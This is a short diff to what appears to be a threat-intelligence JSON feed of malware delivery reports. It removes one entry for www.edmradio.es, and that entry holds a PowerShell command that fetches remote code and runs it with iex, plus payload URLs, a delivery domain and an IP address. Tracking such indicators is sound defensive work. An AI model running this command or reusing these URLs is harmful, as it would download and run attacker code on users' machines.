@@ -6100,24 +6100,5 @@
     "ResolvedDownloadUrl": [],
     "ReportId": "cmwpgskvn233b0omltqhzervg",
     "ScannedAt": "2026-11-20T21:01:46.365000+00:00"
-  },
-  {
-    "UrlDomain": "www.edmradio.es",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/3d49565511570d7b"
-    ],
-    "IP": [
-      "46.30.215.161"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/3d49565511570d7b')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/3d49565511570d7b"
-    ],
-    "ReportId": "cmwpddiwu23050omlwlpexkd6",
-    "ScannedAt": "2026-11-20T19:26:04.902000+00:00"
   }
 ]
